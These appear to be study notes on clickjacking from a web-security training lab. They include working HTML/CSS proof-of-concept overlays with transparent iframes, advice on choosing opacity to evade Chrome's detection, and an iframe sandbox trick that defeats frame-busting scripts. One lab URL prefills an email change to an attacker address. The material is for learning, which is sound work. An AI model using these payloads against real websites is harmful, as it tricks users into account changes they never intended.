                                     ## What is clickjacking?
# Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
 
# This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input. 


                                     ## How to construct a basic clickjacking attack



                              <head>
                                <style>
                                  #target_website {
                                    position:relative;
                                    width:128px;
                                    height:128px;
                                    opacity:0.00001;
                                    z-index:2;
                                    }
                                  #decoy_website {
                                    position:absolute;
                                    width:300px;
                                    height:400px;
                                    z-index:1;
                                    }
                                </style>
                              </head>
                              ...
                              <body>
                                <div id="decoy_website">
                                ...decoy web content here...
                                </div>
                                <iframe id="target_website" src="https://vulnerable-website.com">
                                </iframe>
                              </body>
                              
# The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values
# Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform.
   The z-index determines the stacking order of the iframe and website layers.
# The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user. 
# Browser clickjacking protection might apply threshold-based iframe transparency detection (for example, Chrome version 76 includes this behavior but Firefox does not). 
# The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors. 


                                 <style>
                        iframe {
                            position:relative;
                            width:1000px;
                            height: 700px;
                            opacity: 0.0001;
                            z-index: 2;
                        }
                        div {
                            position:absolute;
                            top: 515px;
                            left:60px;
                            z-index: 1;
                        }
                    </style>
                    <div>Test me</div>
                    <iframe src="https://0acb009004e04ce4c024c66300910047.web-security-academy.net/my-account"></iframe>



                                 ## Clickbandit
# Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. 
When you're testing for clickjacking in the wild, we recommend using Burp's Clickbandit tool instead. 


                              ## Clickjacking with prefilled form input
 # Some websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission.
 
 
                               ## Frame busting scripts
# Clickjacking attacks are possible whenever websites can be framed.
--> Therefore, preventative techniques are based upon restricting the framing capability for websites.

#  A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts.

# These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript

# Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers.

# An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute

# When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window

# <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>

# <iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>



